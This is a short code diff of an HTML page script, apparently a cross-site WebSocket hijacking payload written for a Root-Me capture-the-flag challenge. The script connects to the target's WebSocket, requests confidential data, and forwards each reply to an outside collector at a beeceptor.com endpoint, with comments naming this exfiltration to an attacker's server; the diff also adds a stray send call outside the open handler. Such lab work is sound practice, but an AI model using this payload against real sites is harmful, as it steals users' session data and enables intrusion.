@@ -46,13 +46,13 @@
 <body>
     <p id="color">#000000</p>
     <script>
-        fetch('https://websocket.free.beeceptor.com')
         websocket = new WebSocket('ws://ctf15.root-me.org/ws')
         websocket.onopen = start
         websocket.onmessage = handleReply
         function start(event) {
             websocket.send("READY"); //Send the message to retreive confidential information
         }
+        websocket.send("Hello")
         function handleReply(event) {
               //Exfiltrate the confidential information to attackers server
               fetch('https://websocket.free.beeceptor.com/?'+event.data, {mode: 'no-cors'})
